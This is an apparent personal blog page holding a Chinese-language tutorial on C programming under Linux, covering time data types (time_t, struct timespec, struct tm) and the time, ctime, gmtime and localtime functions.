<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="韩乔落">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
        
        
        
    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://jelasin.github.io/2025/01/23/c语言编程/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="前言如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以利用为主，如果你想深究其原理请看">
<meta property="og:type" content="article">
<meta property="og:title" content="C语言编程">
<meta property="og:url" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/index.html">
<meta property="og:site_name" content="Jelasin">
<meta property="og:description" content="前言如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以利用为主，如果你想深究其原理请看">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112233881.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113446445.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114253555.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114356098.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112327181.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113130101.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220113221756.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220114533148.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220115844667.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120004292.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220120017977.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220133319520.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134042993.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134158438.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220134613354.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250314172903564.png">
<meta property="og:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/libcoroutine-1743588401161-4.png">
<meta property="article:published_time" content="2025-01-23T06:44:14.000Z">
<meta property="article:modified_time" content="2025-04-02T10:06:43.489Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://jelasin.github.io/2025/01/23/C%E8%AF%AD%E8%A8%80%E7%BC%96%E7%A8%8B/image-20250220112233881.png">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-3333333333"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-3333333333');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/favicon.ico" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/favicon.ico">
    <!--- Page Info-->
    
    <title>
        
            C语言编程 | Jelasin
        
    </title>

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Chillax/chillax.css">

    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/css/build/tailwind.css">
    

    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/GeistMono/geist-mono.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fonts/Geist/geist.css">
    <!--- Font Part-->
    
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"jelasin.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":"Farsan","url":"https://fonts.googleapis.com/css2?family=Farsan&display=swap"},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":false,"site_uv":false,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":true,"google_analytics":{"enable":true,"id":"G-3333333333"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"“会当身由己，婉转入江湖”","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":null,"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Links":{"icon":"fa-regular fa-link","submenus":{"看雪":"https://bbs.kanxue.com/homepage-958172.htm","吾爱破解":"https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space","中国诗歌网":"https://www.zgshige.com/c/2022-04-13/21151100.shtml"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":{"Essays":{"path":"/essays","icon":"fa-regular fa-comment"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"AI":{"path":"/AI","icon":"fa-brands fa-python"},"IOT":{"path":"/IOT","icon":"fas fa-network-wired"},"CTF":{"path":"/CTF","icon":"fa-solid fa-snowflake"},"Web":{"path":"/Web","icon":"fa-solid fa-shield"},"Linux":{"path":"/Linux","icon":"fa-brands fa-linux"},"Android":{"path":"/Android","icon":"fa-brands fa-android"},"Windows":{"path":"/Windows","icon":"fa-brands fa-windows"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":4},"tags":{"enable":true,"limit":4}},"footerStart":"2023/9/20 11:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/fontawesome.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/brands.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/solid.min.css">
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.2/files/source/fontawesome/regular.min.css">
    
    
    
    
<meta name="generator" content="Hexo 6.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
                <a class="logo-image h-8 w-8 sm:w-10 sm:h-10 mr-3" href="/">
                    <img src="/images/favicon.ico" class="w-full h-full rounded-sm">
                </a>
            
            <a class="logo-title" href="/">
                
                Jelasin
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/archives"
                                        >
                                    <i class="fa-regular fa-archive fa-fw"></i>
                                    ARCHIVES
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown"
                                   href="#"
                                        onClick=&#34;return false;&#34;>
                                    <i class="fa-regular fa-link fa-fw"></i>
                                    LINKS
                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
                                </a>

                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">
                                                    看雪
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">
                                                    吾爱破解
                                                </a>
                                            </li>
                                        
                                            <li>
                                                <a target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">
                                                    中国诗歌网
                                                </a>
                                            </li>
                                        
                                    </ul>
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/archives"
                        >
                            <span>
                                ARCHIVES
                            </span>
                            
                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
                        
                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                             navbar-data-toggle="submenu-Links"
                        >
                            <span>
                                LINKS
                            </span>
                            
                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
                            
                        </div>
                        

                        
                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-Links">
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://bbs.kanxue.com/homepage-958172.htm">看雪</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.52pojie.cn/home.php?mod=space&uid=2101606&do=thread&view=me&from=space">吾爱破解</a>
                                    </div>
                                
                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                        <a class=" text-third-text-color text-xl"
                                           target="_blank" rel="noopener" href="https://www.zgshige.com/c/2022-04-13/21151100.shtml">中国诗歌网</a>
                                    </div>
                                
                            </div>
                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/essays"
                        >
                            <span>Essays</span>
                            <i class="fa-regular fa-comment fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>Categories</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/AI"
                        >
                            <span>AI</span>
                            <i class="fa-brands fa-python fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/IOT"
                        >
                            <span>IOT</span>
                            <i class="fas fa-network-wired fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/CTF"
                        >
                            <span>CTF</span>
                            <i class="fa-solid fa-snowflake fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Web"
                        >
                            <span>Web</span>
                            <i class="fa-solid fa-shield fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Linux"
                        >
                            <span>Linux</span>
                            <i class="fa-brands fa-linux fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Android"
                        >
                            <span>Android</span>
                            <i class="fa-brands fa-android fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/Windows"
                        >
                            <span>Windows</span>
                            <i class="fa-brands fa-windows fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">40</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">134</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">C语言编程</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/touxiang.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">韩乔落</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-01-23 14:44:14</span>
        <span class="mobile">2025-01-23 14:44:14</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-04-02 18:06:43</span>
            <span class="mobile">2025-04-02 18:06:43</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>如果你是一个刚开始学C语言的小白，那么这篇文章可能并不十分适合你（但结尾放了几个C语言的中小项目，感兴趣的同学可以跟着看一下），本文主要聚焦于C语言的一些陷阱和缺陷，我的本职工作是二进制安全研究，关于这些缺陷导致的致命问题也写了很多文章(Pwn系列)。本文讨论的主要包括指针问题，C的语法糖，线程安全问题，系统编程问题，建议的编程风格和习惯等内容。这里编程部分以利用为主，如果你想深究其原理请看 《Linux环境编程与内核》以及《Linux内核分析》系列文章。</p>
<p>本文只探讨在Linux环境下的C语言编程。</p>
<p>本文将补充未在《Linux环境编程与内核》提到的相关API。</p>
<h1 id="Linux-C-时间处理"><a href="#Linux-C-时间处理" class="headerlink" title="Linux C 时间处理"></a>Linux C 时间处理</h1><h2 id="格林尼治时间"><a href="#格林尼治时间" class="headerlink" title="格林尼治时间"></a>格林尼治时间</h2><p>所有的UNIX系统都使用同一个时间和日期的起点：格林尼治时间（GMT）1970年1月1 日午夜（0点）。这是“UNIX纪元的起点”，Linux也不例外。Linux系统中所有的时间都以从那时起经过的秒数来衡量</p>
<p>在 Linux C 编程中，处理时间和日期相关的操作通常需要使用一些标准库函数。以下是关于时间处理的相关函数的详细讲解：</p>
<h2 id="时间数据类型"><a href="#时间数据类型" class="headerlink" title="时间数据类型"></a>时间数据类型</h2><h3 id="time-t"><a href="#time-t" class="headerlink" title="time_t"></a><code>time_t</code></h3><p>在处理时间时，最常使用的数据类型是<code>time_t</code>。它通常用于表示从1970年1月1日UTC时间（也称为Unix纪元）开始的秒数。</p>
<ul>
<li>时间通过一个预定义的类型time_t来处理，我们称time_t表示的时间成为<strong>日历时间</strong></li>
<li>这是一个大到能够容纳以秒计算的日期和时间的整数类型，它代表从<strong>格林尼治时间开始截止到目前为止的时间秒数</strong></li>
<li>在Linux系统中，它是一个<strong>长整型</strong>，与处理时间值的函数一起定义在头文件<code>time.h</code>中</li>
</ul>
<h3 id="struct-timespec"><a href="#struct-timespec" class="headerlink" title="struct timespec"></a><code>struct timespec</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> &#123;</span></span><br><span class="line">    <span class="type">time_t</span> tv_sec;   <span class="comment">// 秒</span></span><br><span class="line">    <span class="type">long</span>   tv_nsec;  <span class="comment">// 纳秒</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>timespec结构体按照<strong>秒和纳秒</strong>来定义时间</p>
<ul>
<li>结构体中至少包含以上两个成员：   <ul>
<li><strong>tv_sec：秒数</strong></li>
<li><strong>tv_nsec：纳秒</strong></li>
</ul>
</li>
<li>timespec结构体提供了更高精度的时间戳</li>
</ul>
<h3 id="struct-tm"><a href="#struct-tm" class="headerlink" title="struct tm"></a><code>struct tm</code></h3><p><code>tm</code>结构体包含以下字段：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> tm_sec;   <span class="comment">// 秒数 [0, 60]</span></span><br><span class="line">    <span class="type">int</span> tm_min;   <span class="comment">// 分钟数 [0, 59]</span></span><br><span class="line">    <span class="type">int</span> tm_hour;  <span class="comment">// 小时数 [0, 23]</span></span><br><span class="line">    <span class="type">int</span> tm_mday;  <span class="comment">// 月中的第几天 [1, 31]</span></span><br><span class="line">    <span class="type">int</span> tm_mon;   <span class="comment">// 第几个月 [0, 11]</span></span><br><span class="line">    <span class="type">int</span> tm_year;  <span class="comment">// 年份，从1900年开始</span></span><br><span class="line">    <span class="type">int</span> tm_wday;  <span class="comment">// 星期几 [0, 6]，星期天为0</span></span><br><span class="line">    <span class="type">int</span> tm_yday;  <span class="comment">// 年中的第几天 [0, 365]</span></span><br><span class="line">    <span class="type">int</span> tm_isdst; <span class="comment">// 夏令时标志</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>tm_sec：</strong>其范围超过59是因为其允许临时表示润秒（Single UNIX Specification的以前版本允许双润秒，所以该字段的范围为<code>0~61</code>，但是UTC的正式定义不允许双润秒，所以现在该字段的范围为<code>0~60</code>）</li>
<li>除了月日字段，其他字段都是以0开始</li>
<li><strong>tm_isdest：</strong>如果夏令时生效，则该字段值为正；如果为非夏令时时间，则该字段值为0；如果此信息不可用，则其值为负</li>
</ul>
<h2 id="时间处理函数"><a href="#时间处理函数" class="headerlink" title="时间处理函数"></a>时间处理函数</h2><h3 id="time"><a href="#time" class="headerlink" title="time()"></a><code>time()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">time_t</span> <span class="title function_">time</span><span class="params">(<span class="type">time_t</span> *tloc)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：返回当前时间，从1970年1月1日开始的秒数。</li>
<li>参数：<code>tloc</code>如果不是<code>NULL</code>，则当前时间也会存储在指向的内存位置。</li>
<li>返回值：当前时间以<code>time_t</code>格式。</li>
</ul>
<h3 id="ctime"><a href="#ctime" class="headerlink" title="ctime()"></a><code>ctime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">ctime</span><span class="params">(<span class="type">const</span> <span class="type">time_t</span> *timep)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>功能：将时间值转换为本地时间的字符串表示。</li>
<li>参数：指向<code>time_t</code>类型的指针。</li>
<li>返回值：指向静态字符串的指针，格式通常为“Wed Jun 30 21:49:08 1993\n”。</li>
</ul>
<h3 id="gmtime-localtime"><a href="#gmtime-localtime" class="headerlink" title="gmtime()&#x2F;localtime()"></a><code>gmtime()</code>&#x2F;<code>localtime()</code></h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> tm *<span class="title function_">gmtime</span><span class="params">(<span class="type">const</span> <span class="type">time_t</span> *timep)</span>;</span><br><span class="line"><span class="keyword">struct</span> tm *<span class="title function_">localtime</span><span class="params">(<span class="type">const</span> <span class="type">time_t</span> *timep)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li>功能：将<code>time_t</code>格式的时间转换为<code>tm</code>结构体，分别表示UTC时间和本地时间。</li>
<li>返回值：指向<code>tm</code>结构体的指针，该结构体包含了详细的时间信息。</li>
</ul>
